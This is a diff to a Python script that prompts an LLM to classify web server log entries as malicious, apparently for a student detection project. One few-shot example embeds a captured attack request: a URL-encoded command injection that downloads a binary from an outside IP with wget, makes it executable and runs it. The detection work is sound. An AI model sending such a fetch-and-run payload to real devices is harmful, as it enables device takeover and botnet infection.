@@ -74,7 +74,7 @@ def generate_few_shot(log):
         "    ""reason"": ""[8]"",\n"
         "    ""explanation"": ""skipped""\n"
         "}\n"
-        "Log Entry 3: 185.40.4.51 - - [21/Mar/2025:06:58:23 +0000] ""POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20meowarm7%3B%20wget%20http%3A%2F%2F42.112.26.36%2Fmeowarm7%3B%20chmod%20777%20%2A%3B%20.%2Fmeowarm7%20tbk HTTP/1.1"" 400 483 ""-"" ""-""\n"
+        "Log Entry 3: 185.40.4.51 - - [21/Mar/2025:06:58:23 +0000] ""POST /device.rsp?opt=sys&/cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20meowarm7%3B%20wget%20http%3A%2F%2F42.112.26.36%2Fmeowarm7%3B%20chmod%20777%20%2A%3B%20.%2Fmeowarm7%20tbk HTTP/1.1"" 400 483 ""-"" ""-""\n"
         "Response:\n"
         "{\n"
         "    ""classification"": ""Malicious"",\n"
@@ -157,13 +157,18 @@ def classify_log(prompts):
     for output in outputs:
         prompt = output.prompt
         generated_answer = output.outputs[0].text.lower()
+        print(generated_answer)
         matched = False
         for line in generated_answer.split("\n"):
             if "reason" in line:
                 matched = True
-                match = re.search(r'"reason":\s*"([^"]*)"', line)
+                match = re.search(r'"reason":\s*(\[[^\]]*\]|"[^"]*"|\d+)', line)
                 if match:
                     reason_str = match.group(1)
+                    # Remove quotes if value is a string representation
+                    if reason_str.startswith('"') and reason_str.endswith('"'):
+                        reason_str = reason_str[1:-1]
+                    
                     categories = parse_label_string(reason_str)
                     predictions.append(categories)
                     break
@@ -172,6 +177,7 @@ def classify_log(prompts):
                     break
         if not matched:
             predictions.append([0])
+    print(predictions)
     return predictions
 
 if __name__ == "__main__":
@@ -186,11 +192,11 @@ if __name__ == "__main__":
         "llm": 8,
         "other": 9
     }
-    dataset_path = glob.glob("../data/fyp_data/*.csv")
+    dataset_path = glob.glob("../data/fyp_data/injected_log.csv")
     
     df = pd.concat((load_csv(f) for f in dataset_path), ignore_index=True)
     df = df.drop(df.columns[3:], axis=1)
-    df["category"] = df["category"].apply(    
+    df["category"] = df["category"].apply(
         lambda x: sorted([
             taxonomy_map[k.strip().lower()]
             for k in str(x).split(',')
@@ -212,9 +218,9 @@ if __name__ == "__main__":
         for log in batch:
             prompts.append(generate_few_shot(log))
         predictions.extend(classify_log(prompts))
-        print(prompts)
     
     df['prediction'] = predictions
+    
     
     total_count = len(df)
     correct_rows = df.apply(
